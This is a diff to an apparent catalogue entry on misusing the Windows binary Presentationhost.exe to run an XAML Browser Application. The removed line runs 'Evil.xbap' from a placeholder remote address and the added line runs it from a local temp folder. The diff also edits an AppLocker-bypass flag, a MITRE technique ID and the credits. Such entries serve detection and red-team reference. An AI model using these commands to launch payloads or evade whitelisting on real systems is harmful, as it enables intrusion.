@@ -1,15 +1,14 @@
 ## Presentationhost.exe
 ```
 
-Presentationhost.exe file:///x.x.x.x/Evil.xbap
+Presentationhost.exe C:\temp\Evil.xbap
 Executes the target XAML Browser Application (XBAP) file.
 ```
 * Windows binary: True   
-* Bypasses Default AppLocker Rules: True   
-* Mitre: None 
+* Bypasses Default AppLocker Rules: False   
+* Mitre: [T1117](https://attack.mitre.org/wiki/Technique/T1117)   
    
 * Links:   
-  * https://medium.com/@jpg.inc.au/applocker-bypass-presentationhost-exe-8c87b2354cd4
   * https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
   * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
    
@@ -21,8 +20,5 @@ Executes the target XAML Browser Application (XBAP) file.
   * Name: Casey Smith
     * Twitter: [@Subtee](https://twitter.com/@Subtee)
     * Blog: https://subt0x11.blogspot.com/
-  * Name: JPGInc
-    * Twitter: [@JPG1nc](https://twitter.com/@JPG1nc)
-    * Blog: https://medium.com/@jpg.inc.au
    
 OS:  
